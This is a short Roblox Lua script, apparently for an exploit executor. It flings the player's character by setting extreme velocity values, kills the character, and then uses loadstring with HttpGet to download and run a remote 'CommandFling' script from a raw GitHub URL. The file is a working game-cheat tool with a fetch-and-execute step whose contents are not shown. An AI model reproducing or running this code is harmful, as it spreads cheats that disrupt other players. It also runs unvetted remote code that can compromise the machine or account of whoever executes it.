local LocalPlayer = game.Players.LocalPlayer
local HumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
local Velocity = HumanoidRootPart.AssemblyLinearVelocity

function main()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/3isht/3isht/refs/heads/master/CommandFling"))()
end


for i = 1, 5 do
    task.wait(.4)
    HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(6666,666,6666)
    if i == 5 then
        LocalPlayer.Character.Humanoid.Health = 0
        task.wait(1.5)
        main()
    end
end
